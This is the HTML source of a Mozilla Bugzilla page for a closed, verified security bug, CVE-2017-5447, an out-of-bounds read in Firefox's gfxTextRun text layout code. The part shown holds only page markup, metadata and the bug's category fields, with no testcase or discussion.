<!DOCTYPE html>
<html lang="en">
  <head>
      <meta charset="UTF-8">
<meta property="og:type" content="website">
<meta property="og:title" content="1343552 - (CVE-2017-5447) ASAN: out-of-bounds read in gfxTextRun (after &quot;ASSERTION: Invalid offset&quot; and &quot;ASSERTION: Substring out of range&quot;)">
<meta property="og:url" content="https://bugzilla.mozilla.org/show_bug.cgi?id=1343552">
<meta property="og:description"
      content="VERIFIED (mats) in Core - Layout: Text and Fonts. Last updated 2018-07-02.">
<meta name="twitter:label1" value="Type">
<meta name="twitter:data1" value="defect">
<meta name="twitter:label2" value="Priority">
<meta name="twitter:data2" value="--">

    <meta name="viewport" content="width=1024">
    <meta name="color-scheme" content="dark light">
    <meta name="generator" content="Bugzilla 20211025.1">
    <meta name="bugzilla-global" content="dummy"
        id="bugzilla-global" data-bugzilla="{&quot;api_token&quot;:&quot;&quot;,&quot;config&quot;:{&quot;basepath&quot;:&quot;\/&quot;},&quot;constant&quot;:{&quot;COMMENT_COLS&quot;:80},&quot;param&quot;:{&quot;maxattachmentsize&quot;:&quot;10240&quot;,&quot;maxusermatches&quot;:&quot;50&quot;,&quot;splinter_base&quot;:&quot;\/page.cgi?id=splinter.html&amp;ignore=\/&quot;},&quot;string&quot;:{&quot;bug_type_required&quot;:&quot;You must select a Type for this bug&quot;,&quot;component_required&quot;:&quot;You must select a Component for this bug&quot;,&quot;description_required&quot;:&quot;You must enter a Description for this bug&quot;,&quot;short_desc_required&quot;:&quot;You must enter a Summary for this bug&quot;,&quot;version_required&quot;:&quot;You must select a Version for this bug&quot;},&quot;user&quot;:{&quot;is_new&quot;:1,&quot;login&quot;:&quot;&quot;}}">
    <title>1343552 - (CVE-2017-5447) ASAN: out-of-bounds read in gfxTextRun (after &quot;ASSERTION: Invalid offset&quot; and &quot;ASSERTION: Substring out of range&quot;)</title>

<link rel="Top" href="/">

  


  
    <link rel="Show" title="Dependency Tree"
          href="/showdependencytree.cgi?id=1343552&amp;hide_resolved=1">
      <link rel="Show" title="Dependency Graph"
            href="/showdependencygraph.cgi?id=1343552">

      <link rel="Show" title="Bug Activity"
            href="/show_activity.cgi?id=1343552">

<link href="/static/v20211025.1/skins/yui.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/skins/standard/global.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/extensions/BugModal/web/bug_modal.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/js/jquery/plugins/contextMenu/contextMenu.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/extensions/BMO/web/styles/bug_modal.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/extensions/EditComments/web/styles/inline-editor.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/js/jquery/ui/jquery-ui-min.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/js/jquery/ui/jquery-ui-structure-min.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/js/jquery/ui/jquery-ui-theme-min.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/skins/lib/prism.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/extensions/Needinfo/web/styles/needinfo.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/extensions/Review/web/styles/badge.css" rel="stylesheet" type="text/css">



    
<script nonce="8e7a440GhCul87cjrmjr9Ri8p2TuZNjDu7d6OFIzIqOZLzWN" src="/static/v20211025.1/js/jquery/jquery-min.js"></script><script nonce="8e7a440GhCul87cjrmjr9Ri8p2TuZNjDu7d6OFIzIqOZLzWN" src="/static/v20211025.1/js/jquery/ui/jquery-ui-min.js"></script><script nonce="8e7a440GhCul87cjrmjr9Ri8p2TuZNjDu7d6OFIzIqOZLzWN" src="/static/v20211025.1/js/yui.js"></script><script nonce="8e7a440GhCul87cjrmjr9Ri8p2TuZNjDu7d6OFIzIqOZLzWN" src="/static/v20211025.1/js/jquery/plugins/contextMenu/contextMenu-min.js"></script><script nonce="8e7a440GhCul87cjrmjr9Ri8p2TuZNjDu7d6OFIzIqOZLzWN" src="/static/v20211025.1/js/jquery/plugins/devbridgeAutocomplete/devbridgeAutocomplete-min.js"></script><script nonce="8e7a440GhCul87cjrmjr9Ri8p2TuZNjDu7d6OFIzIqOZLzWN" src="/static/v20211025.1/js/global.js"></script><script nonce="8e7a440GhCul87cjrmjr9Ri8p2TuZNjDu7d6OFIzIqOZLzWN" src="/static/v20211025.1/js/util.js"></script><script nonce="8e7a440GhCul87cjrmjr9Ri8p2TuZNjDu7d6OFIzIqOZLzWN" src="/static/v20211025.1/js/dropdown.js"></script>

      <script nonce="8e7a440GhCul87cjrmjr9Ri8p2TuZNjDu7d6OFIzIqOZLzWN">
          YAHOO.namespace('bugzilla');
          if ( "onpagehide" in window || YAHOO.env.ua.gecko) {
              YAHOO.util.Event._simpleRemove(window, "unload",
                                             YAHOO.util.Event._unload);
          }BUGZILLA.value_descs = JSON.parse('{\"bug_status\":{},\"resolution\":{\"\":\"---\"}}');

  
    var tracking_flags_str = "{\"flags\":{\"project\":{\"cf_a11y_review_project_flag\":\"---\",\"cf_tracking_firefox_sumo\":\"---\",\"cf_webcompat_priority\":\"---\",\"cf_root_cause\":\"---\",\"cf_fission_milestone\":\"---\"},\"tracking\":{\"cf_status_firefox94\":\"---\",\"cf_tracking_firefox55\":\"+\",\"cf_tracking_thunderbird_esr78\":\"---\",\"cf_status_firefox93\":\"---\",\"cf_tracking_firefox_relnote\":\"---\",\"cf_status_firefox55\":\"verified\",\"cf_tracking_thunderbird_esr91\":\"---\",\"cf_status_firefox_esr78\":\"---\",\"cf_tracking_firefox94\":\"---\",\"cf_status_thunderbird_esr78\":\"---\",\"cf_tracking_firefox_esr78\":\"---\",\"cf_status_firefox_esr52\":\"verified\",\"cf_tracking_firefox93\":\"---\",\"cf_status_firefox53\":\"verified\",\"cf_status_firefox_esr45\":\"verified\",\"cf_status_thunderbird_esr91\":\"---\",\"cf_status_firefox54\":\"verified\",\"cf_tracking_firefox53\":\"+\",\"cf_tracking_firefox_esr52\":\"53+\",\"cf_status_firefox95\":\"---\",\"cf_tracking_firefox54\":\"+\",\"cf_tracking_firefox_esr91\":\"---\",\"cf_tracking_firefox_esr45\":\"53+\",\"cf_tracking_firefox95\":\"---\",\"cf_status_firefox_esr91\":\"---\",\"cf_status_firefox51\":\"wontfix\",\"cf_status_firefox52\":\"wontfix\"}},\"comments\":{\"cf_tracking_firefox95\":{\"?\":\"[Tracking Requested - why for this release]:\"},\"cf_tracking_firefox93\":{\"?\":\"[Tracking Requested - why for this release]:\"},\"cf_tracking_firefox_esr78\":{\"?\":\"[Tracking Requested - why for this release]:\"},\"cf_tracking_firefox94\":{\"?\":\"[Tracking Requested - why for this release]:\"},\"cf_tracking_firefox_esr45\":{\"?\":\"[Tracking Requested - why for this release]:\"},\"cf_a11y_review_project_flag\":{\"requested\":\"Description:\\nPlease provide an explanation of the feature or change. Include a description of the user scenario in which it would be used and how the user would complete the task(s).\\nScreenshots and visual UI specs are welcome, but please include sufficient accompanying explanation so that blind members of the accessibility team are able to understand the feature\/change.\\n\\nHow do we test this?\\nIf there is an implementation to test, please provide instructions for testing it; e.g. setting preferences, other preparation, how to trigger the UI, etc.\\n\\nWhen will this ship?\\nTracking bug\/issue:\\nDesign documents (e.g. Product Requirements Document, UI spec):\\nEngineering lead:\\nProduct manager:\\n\\nThe accessibility team has developed the Mozilla Accessibility Release Guidelines which outline what is needed to make user interfaces accessible:\\nhttps:\/\/wiki.mozilla.org\/Accessibility\/Guidelines\\nPlease describe the accessibility guidelines you considered and what steps you\'ve taken to address them:\\n\\nDescribe any areas of concern to which you want the accessibility team to give special attention:\"},\"cf_tracking_firefox_esr52\":{\"?\":\"[Tracking Requested - why for this release]:\"},\"cf_tracking_firefox_esr91\":{\"?\":\"[Tracking Requested - why for this release]:\"},\"cf_tracking_firefox54\":{\"?\":\"[Tracking Requested - why for this release]:\"},\"cf_tracking_firefox55\":{\"?\":\"[Tracking Requested - why for this release]:\"},\"cf_tracking_firefox_relnote\":{\"?\":\"Release Note Request (optional, but appreciated)\\n[Why is this notable]:\\n[Affects Firefox for Android]:\\n[Suggested wording]:\\n[Links (documentation, blog post, etc)]:\"},\"cf_tracking_firefox53\":{\"?\":\"[Tracking Requested - why for this release]:\"},\"cf_tracking_firefox_sumo\":{\"none-needed\":\"Release Note Request (optional, but appreciated)\\n[Why is this notable]:\\n[Affects Firefox for Android]:\\n[Suggested wording]:\\n[Links (documentation, blog post, etc)]:\"}},\"types\":[\"tracking\"]}";
    var TrackingFlags = $.parseJSON(tracking_flags_str);

  

  
  BUGZILLA.bug_id = 1343552;
  BUGZILLA.bug_title = '1343552 - (CVE-2017-5447) ASAN: out-of-bounds read in gfxTextRun (after \"ASSERTION: Invalid offset\" and \"ASSERTION: Substring out of range\")';
  BUGZILLA.bug_summary = 'ASAN: out-of-bounds read in gfxTextRun (after \"ASSERTION: Invalid offset\" and \"ASSERTION: Substring out of range\")';
  BUGZILLA.bug_url = 'https:\/\/bugzilla.mozilla.org\/show_bug.cgi?id=1343552';
  BUGZILLA.bug_keywords = 'assertion, crash, csectype-bounds, sec-high, testcase',
  BUGZILLA.user = {
    id: 0,
    login: '',
    is_insider: false,
    is_timetracker: false,
    can_tag: false,
    timezone: 'America\/Los_Angeles',
    settings: {
      quote_replies: 'quoted_reply',
      zoom_textareas: true,
      remember_collapsed: true,
      inline_attachments: true,
      autosize_comments: false
    }
  };

  BUGZILLA.bug_secure = false;
      </script>
<script nonce="8e7a440GhCul87cjrmjr9Ri8p2TuZNjDu7d6OFIzIqOZLzWN" src="/static/v20211025.1/extensions/BugModal/web/autosize.min.js"></script><script nonce="8e7a440GhCul87cjrmjr9Ri8p2TuZNjDu7d6OFIzIqOZLzWN" src="/static/v20211025.1/extensions/ProdCompSearch/web/js/prod_comp_search.js"></script><script nonce="8e7a440GhCul87cjrmjr9Ri8p2TuZNjDu7d6OFIzIqOZLzWN" src="/static/v20211025.1/extensions/BugModal/web/bug_modal.js"></script><script nonce="8e7a440GhCul87cjrmjr9Ri8p2TuZNjDu7d6OFIzIqOZLzWN" src="/static/v20211025.1/extensions/BugModal/web/comments.js"></script><script nonce="8e7a440GhCul87cjrmjr9Ri8p2TuZNjDu7d6OFIzIqOZLzWN" src="/static/v20211025.1/extensions/ComponentWatching/web/js/overlay.js"></script><script nonce="8e7a440GhCul87cjrmjr9Ri8p2TuZNjDu7d6OFIzIqOZLzWN" src="/static/v20211025.1/js/bugzilla-readable-status-min.js"></script><script nonce="8e7a440GhCul87cjrmjr9Ri8p2TuZNjDu7d6OFIzIqOZLzWN" src="/static/v20211025.1/js/field.js"></script><script nonce="8e7a440GhCul87cjrmjr9Ri8p2TuZNjDu7d6OFIzIqOZLzWN" src="/static/v20211025.1/js/comments.js"></script><script nonce="8e7a440GhCul87cjrmjr9Ri8p2TuZNjDu7d6OFIzIqOZLzWN" src="/static/v20211025.1/extensions/TrackingFlags/web/js/flags.js"></script><script nonce="8e7a440GhCul87cjrmjr9Ri8p2TuZNjDu7d6OFIzIqOZLzWN" src="/static/v20211025.1/extensions/BMO/web/js/firefox-crash-table.js"></script><script nonce="8e7a440GhCul87cjrmjr9Ri8p2TuZNjDu7d6OFIzIqOZLzWN" src="/static/v20211025.1/extensions/MozChangeField/web/js/severity-s1-priority-p1.js"></script><script nonce="8e7a440GhCul87cjrmjr9Ri8p2TuZNjDu7d6OFIzIqOZLzWN" src="/static/v20211025.1/extensions/MozChangeField/web/js/clear-tracking-priority-s1.js"></script><script nonce="8e7a440GhCul87cjrmjr9Ri8p2TuZNjDu7d6OFIzIqOZLzWN" src="/static/v20211025.1/extensions/MozChangeField/web/js/set-tracking-severity-s1.js"></script><script nonce="8e7a440GhCul87cjrmjr9Ri8p2TuZNjDu7d6OFIzIqOZLzWN" src="/static/v20211025.1/js/lib/prism.js"></script><script nonce="8e7a440GhCul87cjrmjr9Ri8p2TuZNjDu7d6OFIzIqOZLzWN" src="/static/v20211025.1/extensions/GoogleAnalytics/web/js/analytics.js"></script><script nonce="8e7a440GhCul87cjrmjr9Ri8p2TuZNjDu7d6OFIzIqOZLzWN" src="/static/v20211025.1/js/lib/md5.min.js"></script><script nonce="8e7a440GhCul87cjrmjr9Ri8p2TuZNjDu7d6OFIzIqOZLzWN" src="/static/v20211025.1/extensions/Review/web/js/badge.js"></script>

    

    
    <link rel="search" type="application/opensearchdescription+xml"
                       title="Bugzilla@Mozilla" href="/search_plugin.cgi"><link rel="shortcut icon" href="/extensions/BMO/web/images/favicon.ico">
<link rel="canonical" href="https://bugzilla.mozilla.org/show_bug.cgi?id=1343552">
<link rel="shorturl" href="https://bugzilla.mozilla.org/1343552"><meta name="google-analytics" content="UA-36116321-3" data-location="https://bugzilla.mozilla.org/bug/show-modal" data-title="1343552 - (CVE-2017-5447) ASAN: out-of-bounds read in gfxTextRun (after &amp;quot;ASSERTION: Invalid offset&amp;quot; and &amp;quot;ASSERTION: Substring out of range&amp;quot;)">
<script async src="https://www.google-analytics.com/analytics.js"></script><meta name="robots" content="noarchive">
  </head>



  <body
        class="bugzilla-mozilla-org
               skin-standard bug_modal yui-skin-sam">



<div id="wrapper">

<header id="header" role="banner">
  <div class="inner">
    <h1 id="header-title" class="title"><a href="https://bugzilla.mozilla.org/home" title="Go to home page">Bugzilla</a></h1>
    <form role="search" id="header-search" class="quicksearch" action="/buglist.cgi" data-no-csrf>
      <section class="searchbox-outer dropdown" role="combobox" aria-expanded="false" aria-haspopup="listbox"
               aria-labelledby="header-search-label" aria-owns="header-search-dropdown">
        <h2 id="header-search-label">Quick Search</h2>
        <span class="icon" aria-hidden="true"></span>
        <input role="searchbox" id="quicksearch_top" class="dropdown-button" name="quicksearch" autocomplete="off"
               value="" placeholder="Search Bugs"
               title="Enter a bug number or some search terms" aria-controls="header-search-dropdown"
               aria-label="Quick Search"><div id="header-search-dropdown" class="dropdown-content right" role="listbox" style="display: none;">
  <div id="header-search-dropdown-wrapper">
  </div>
</div>
      </section>
    </form>
    <nav id="header-nav">
      <ul class="links">
        <li class="link-browse">
          <a href="/describecomponents.cgi" title="Browse bugs by component">
            <span class="icon" aria-hidden="true"></span>
            <span class="label">Browse</span>
          </a>
        </li>
        <li class="link-search">
          <a href="/query.cgi?format=advanced" title="Search bugs using various criteria">
            <span class="icon" aria-hidden="true"></span>
            <span class="label">Advanced Search</span>
          </a>
        </li>
      </ul>
      <div class="dropdown">
        <button type="button" id="header-tools-menu-button" class="dropdown-button minor" title="More tools…"
                aria-label="More tools…" aria-expanded="false" aria-haspopup="true" aria-controls="header-tools-menu">
          <span class="icon" aria-hidden="true"></span>
        </button>
        <ul class="dropdown-content left" id="header-tools-menu" role="menu" style="display:none;">
          <li role="presentation">
            <a href="/report.cgi" role="menuitem" tabindex="-1">Reports</a>
          </li>
            <li role="separator"></li>
            <li role="presentation">
              <a href="https://bmo.readthedocs.io/en/latest/" role="menuitem" tabindex="-1">Documentation</a>
            </li>
        </ul>
      </div>
    </nav>
      <ul id="header-login" class="links">
          <li id="moz_new_account_container_top"><a href="/createaccount.cgi">New Account</a></li><li id="mini_login_container_top">
  <a id="login_link_top" href="/index.cgi?GoAheadAndLogIn=1"
     class='show_mini_login_form' data-qs-suffix="_top">Log In</a>

  <div id="mini_login_top" class="mini-popup mini_login bz_default_hidden"><span id="github_mini_login_top" class="mini_login_top">
    <form method="post" action="/github.cgi">
      <input type="hidden" name="github_secret" value="4y6CoYVBgbx4ZhJhu7mJM13jsZj2j1XehHotWP9aA1Crwpar2t2KzFMPCtV0V6xPl0fxnWjKrh7b7jWwLABm8hRlWEmIkXDlTooI5KpMlXTSZXmpSbx3OpRWOdWHaHuHBSklGtp3BNhU2HQ6ITI40b2moks4ERkr1VUFfTYEXJEWv2QkGIOFXzt5QTARnsG3gMm0mS7KkDZQpLosAH02DqmVN3kQASlk35L4WSjQHgRkKGfUHitxiKmZZrVsu5OP">
      <input type="hidden" name="target_uri" value="https://bugzilla.mozilla.org/show_bug.cgi">
      <input type="image" src="/extensions/GitHubAuth/web/images/sign_in.png" height="22" width="75" align="absmiddle"
             alt="Sign in with GitHub"
             title="Sign in with GitHub"> or
    </form>
  </span>

  <form action="/show_bug.cgi?id=1343552" method="POST"
        data-qs-suffix="_top">

    <input id="Bugzilla_login_top"
           class="bz_login"
           name="Bugzilla_login"
           title="Login"
           placeholder="Email"
           aria-label="Email"
           type="email"
           required
    >
    <input class="bz_password"
           id="Bugzilla_password_top"
           name="Bugzilla_password"
           type="password"
           title="Password"
           placeholder="Password"
           aria-label="Password"
           required
    >
    <input class="bz_password bz_default_hidden bz_mini_login_help" type="text"
           id="Bugzilla_password_dummy_top" value="password"
           title="Password"
    >
      <input type="checkbox" id="Bugzilla_remember_top"
             name="Bugzilla_remember" value="on" class="bz_remember"
                 checked>
      <label for="Bugzilla_remember_top">Remember</label>
    <input type="hidden" name="Bugzilla_login_token"
           value="">
    <input type="submit" name="GoAheadAndLogIn" value="Log in"
           class="check_mini_login_fields"
            id="log_in_top">
    <a href="#" id="hide_mini_login_top" aria-label="Close"
       class="close-button hide_mini_login_form" data-qs-suffix="_top">
      <span class="icon" aria-hidden="true"></span>
    </a>
  </form>
  </div>
</li>
<li id="forgot_container_top">
  <a id="forgot_link_top" href="/index.cgi?GoAheadAndLogIn=1#forgot"
     class='show_forgot_form'
     data-qs-suffix="_top">Forgot Password</a>
  <div id="forgot_form_top" class="mini-popup mini_forgot bz_default_hidden">
  <form action="/token.cgi" method="post">
    <input type="email" name="loginname" size="20" placeholder="Email" aria-label="Email" required>
    <input id="forgot_button_top" value="Reset Password"
           type="submit">
    <input type="hidden" name="a" value="reqpw">
    <input type="hidden" id="token_top" name="token" value="1635623135-tAxRUeHXkiIFhr__h2VOpqcrqYya_Io7O0gi95trajQ">
    <a href="#" class="close-button hide_forgot_form" aria-label="Close" data-qs-suffix="_top">
      <span class="icon" aria-hidden="true"></span>
    </a>
  </form>
  </div>
</li>
      </ul><div id="header-external-links" class="dropdown first">
  <button type="button" id="header-external-menu-button" class="dropdown-button minor" title="Mozilla"
          aria-label="Mozilla" aria-expanded="false" aria-haspopup="true" aria-controls="header-external-menu">
    <img src="/static/v20211025.1/extensions/BMO/web/images/moz-fav-one-color-white-rgb.svg" width="32" height="32" alt="">
  </button>
  <ul class="dropdown-content right" id="header-external-menu" role="menu" style="display:none;">
    <li role="presentation">
      <a href="https://www.mozilla.org/" role="menuitem" tabindex="-1">Mozilla Home</a>
    </li>
    <li role="separator"></li>
    <li role="presentation">
      <a href="https://www.mozilla.org/privacy/websites/" role="menuitem" tabindex="-1">Privacy</a>
    </li>
    <li role="presentation">
      <a href="https://www.mozilla.org/privacy/websites/#cookies" role="menuitem" tabindex="-1">Cookies</a>
    </li>
    <li role="presentation">
      <a href="https://www.mozilla.org/about/legal/" role="menuitem" tabindex="-1">Legal</a>
    </li>
  </ul>
</div>
  </div>
</header> 


<main id="bugzilla-body" tabindex="-1">

<aside id="message-container" role="complementary">
  <noscript>
    <div class="noscript">
      <div class="inner">
        <p>Please enable JavaScript in your browser to use all the features on this site.</p>
      </div>
    </div>
  </noscript>
</aside>

<div id="main-inner">




<div role="toolbar" id="page-toolbar">
  <div role="group" class="buttons">
    <button type="button" id="copy-summary" class="secondary"
      title="Copy bug number and summary to your clipboard">Copy Summary</button>
    <div id="clip-container" style="display:none"><input type="text" id="clip"></div>
    <div class="dropdown">
      <button type="button" id="action-menu-btn" aria-haspopup="true" aria-label="View"
        aria-expanded="false" aria-controls="action-menu" class="dropdown-button secondary">View &#9662;</button>
      <ul class="dropdown-content left" id="action-menu" role="menu" style="display:none;">
        <li role="presentation">
          <a id="action-reset" role="menuitem" tabindex="-1">Reset Sections</a>
        </li>
        <li role="presentation">
          <a id="action-expand-all" role="menuitem" tabindex="-1">Expand All Sections</a>
        </li>
        <li role="presentation">
          <a id="action-collapse-all" role="menuitem" tabindex="-1">Collapse All Sections</a>
        </li>
        <li role="separator"></li>
        <li role="presentation">
          <a id="action-history" role="menuitem" tabindex="-1">History</a>
        </li>
        <li role="separator"></li>
        <li role="presentation">
          <a href="/rest/bug/1343552" role="menuitem" tabindex="-1">JSON</a>
        </li>
        <li role="presentation">
          <a href="/show_bug.cgi?ctype=xml&amp;id=1343552" role="menuitem" tabindex="-1">XML</a>
        </li>
      </ul>
    </div>
  </div>
</div>



<div role="status" id="io-error" style="display:none"></div>
<div role="status" id="floating-message" style="display:none">
  <div id="floating-message-text"></div>
</div>
<section class="module"
>
  <div class="module-content"
  >
  <div id="summary-container">
    <div class="field indent" id="field-status_summary"
>


  
    <div class=" container">
        <span id="field-value-status_summary">
      <span class="bug-status-label text" data-status="closed">Closed</span>
      <span id="field-value-bug_id">
        <a href="/show_bug.cgi?id=1343552">Bug 1343552</a>
          <span class="edit-hide">(CVE-2017-5447)</span>
      </span>
      <span>
        <span class="bug-time-label">Opened <span class="rel-time" title="2017-03-01 07:56 PST" data-time="1488383809">5 years ago</span></span>
          <span class="bug-time-label">Closed <span class="rel-time" title="2017-03-09 16:36 PST" data-time="1489106195">5 years ago</span></span>
      </span>
        </span>
    </div>

  
</div>
<div class="field indent edit-hide"
>


  
    <div class=" container">
      

      <h1 id="field-value-short_desc">ASAN: out-of-bounds read in gfx<wbr>Text<wbr>Run (after &quot;ASSERTION: Invalid offset&quot; and &quot;ASSERTION: Substring out of range&quot;)</h1>
    </div>

  
</div>

    <div class="field edit-show" id="field-short_desc" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#short_desc" id="short_desc-help-link" class="help">Summary:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-short_desc">
            ASAN: out-of-bounds read in gfxTextRun (after &quot;ASSERTION: Invalid offset&quot; and &quot;ASSERTION: Substring out of range&quot;)

        </span>
    </div>

  
</div>
  </div>
  </div>
</section>


<section class="module" id="module-categories"
>
    <header id="module-categories-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse Categories section"
           data-label-collapsed="Expand Categories section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-categories-content"
             aria-expanded="true"
             aria-labeledby="module-categories-title"
             aria-describedby="module-categories-subtitle"></div>
        <h2 class="module-title" id="module-categories-title">Categories</h2>
          <h3 class="module-subtitle" id="module-categories-subtitle">
            (Core :: Layout: Text and Fonts, defect)
          </h3>
      </div>
    </header>
  <div class="module-content" id="module-categories-content"
  ><div class="fields-lhs">

    <div class="field" id="field-product"
>
    <div class="name">
        <a href="/describecomponents.cgi?product=Core" id="product-help-link" class="help">Product:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-product">
      <div class="name-info-outer dropdown">
        <span id="product-name" class="dropdown-button" tabindex="0" role="button"
             aria-haspopup="menu" aria-controls="product-info">Core
          <span class="icon" aria-hidden="true">&#x25BE;</span>
        </span>
        <aside id="product-info" class="name-info-popup dropdown-content right hover-display" hidden role="menu"
               aria-label="Product description and actions">
          <header>
            <div class="title">Core</div>
            <div class="description">Shared components used by Firefox and other Mozilla software, including handling of Web content; Gecko, HTML, CSS, layout, DOM, scripts, images, networking, etc. Issues with web page layout probably go here, while Firefox user interface issues belong in the <a href="https://bugzilla.mozilla.org/describecomponents.cgi?product=Firefox">Firefox</a> product. (<a href="https://wiki.mozilla.org/Modules/All#Core">More info</a>)</div>
          </header>
          <li role="separator"></li>
          <div class="actions">
            <div><a href="/buglist.cgi?product=Core&amp;bug_status=__open__"
                    target="_blank" role="menuitem" tabindex="-1">See Open Bugs in This Product</a></div>
            <div><a href="/enter_bug.cgi?product=Core"
                    target="_blank" role="menuitem" tabindex="-1">File New Bug in This Product</a></div>
            <div><button disabled type="button" class="secondary component-watching" role="menuitem" tabindex="-1"
                         data-product="Core"
                         data-label-watch="Watch This Product" data-label-unwatch="Unwatch This Product"
                         data-source="BugModal">Watch This Product</button></div>
          </div>
        </aside>
      </div>
        </span>
    </div>

  
</div>

    <div class="field" id="field-component"
>
    <div class="name">
        <a href="/describecomponents.cgi?product=Core&component=Layout%3A%20Text%20and%20Fonts#Layout%3A%20Text%20and%20Fonts" id="component-help-link" class="help">Component:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-component">
      <div class="name-info-outer dropdown">
        <span id="component-name" class="dropdown-button" tabindex="0" role="button"
             aria-haspopup="menu" aria-controls="component-info">Layout: Text and Fonts
          <span class="icon" aria-hidden="true">&#x25BE;</span>
        </span>
        <aside id="component-info" class="name-info-popup dropdown-content right hover-display" hidden role="menu"
               aria-label="Component description and actions">
          <header>
            <div class="title">Core :: Layout: Text and Fonts</div>
            <div class="description"><p>Issues with CSS font selection, font loading, text shaping and glyph selection, breaking, text decorations, bidirectional text processing, and white space processing. For issues with glyph rendering and font format support, see the Graphics: Text component.</p>
<p>Example bugs:</p>
<ul>
  <li>line-breaking code does not handle supplementary-plane characters properly</li>
  <li>double or wavy decoration lines are not repainted correctly if specified on floating first letter</li>
</ul>
<p>Specifications covered:</p>
<ul>
  <li>CSS Fonts</li>
  <li>CSS Size Adjustment</li>
  <li>CSS Text</li>
  <li>CSS Text Decoration</li>
</ul></div>
          </header>
          <li role="separator"></li>
          <div class="actions">
            <div><a href="/buglist.cgi?product=Core&amp;component=Layout%3A%20Text%20and%20Fonts&amp;bug_status=__open__"
                    target="_blank" role="menuitem" tabindex="-1">See Open Bugs in This Component</a></div>
            <div><a href="/buglist.cgi?product=Core&amp;component=Layout%3A%20Text%20and%20Fonts&amp;chfield=resolution&chfieldfrom=-6m&chfieldvalue=FIXED&bug_status=__closed__"
                    target="_blank" role="menuitem" tabindex="-1">Recently Fixed Bugs in This Component</a></div>
            <div><a href="/enter_bug.cgi?product=Core&amp;component=Layout%3A%20Text%20and%20Fonts"
                    target="_blank" role="menuitem" tabindex="-1">File New Bug in This Component</a></div>
            <div><button disabled type="button" class="secondary component-watching" role="menuitem" tabindex="-1"
                         data-product="Core" data-component="Layout: Text and Fonts"
                         data-label-watch="Watch This Component" data-label-unwatch="Unwatch This Component"
                         data-source="BugModal">Watch This Component</button></div>
          </div>
        </aside>
      </div>
        </span>
    </div>

  
</div>

    <div class="field edit-show" id="field-version" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#version" id="version-help-link" class="help">Version:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-version">
            Trunk

        </span>
    </div>

  
</div>

    <div class="field edit-show" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#rep_platform" id="-help-link" class="help">Platform:
        </a>
    </div>


  
    <div class=" container"><div class="field inline" id="field-rep_platform"
>


  
    <div class="value">
        <span id="field-value-rep_platform">
            All

        </span>
    </div>

  
</div><div class="field indent inline" id="field-op_sys"
>


  
    <div class="value">
        <span id="field-value-op_sys">
            All

        </span>
    </div>

  
</div><div class="field indent inline"
>


  
    <div class=" container">
    </div>

  
</div>
    </div>

  
</div>
</div><div class="fields-rhs">

    <div class="field contains-buttons" id="field-bug_type"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_type" id="bug_type-help-link" class="help">Type:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-bug_type">
      <span class="bug-type-label iconic-text" data-type="defect">
        <span class="icon" aria-hidden="true"></span>defect</span>
        </span>
    </div>

  
</div>

    <div class="field" id="field-importance"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#priority" id="importance-help-link" class="help">Priority:
        </a>
    </div>


  
    <div class=" container">
        <span id="field-value-importance"><div class="field inline" id="field-priority"
>


  
    <div class="value">
        <span id="field-value-priority">
          <em>Not set</em>
        </span>
    </div>

  
</div><div class="field inline" id="field-bug_severity"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_severity" id="bug_severity-help-link" class="help">Severity:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-bug_severity">
            critical

        </span>
    </div>

  
</div>
        </span>
    </div>

  
</div>

    <div class="field edit-show" id="field-cf_fx_points" style="display:none"
>
    <div class="name">Points:
    </div>


  
    <div class="value">
        <span id="field-value-cf_fx_points">
            ---

        </span>
    </div>

  
</div>
</div>
  </div>
</section>


<section class="module" id="module-tracking"
>
    <header id="module-tracking-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse Tracking section"
           data-label-collapsed="Expand Tracking section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-tracking-content"
             aria-expanded="true"
             aria-labeledby="module-tracking-title"
             aria-describedby="module-tracking-subtitle"></div>
        <h2 class="module-title" id="module-tracking-title">Tracking</h2>
          <h3 class="module-subtitle" id="module-tracking-subtitle">
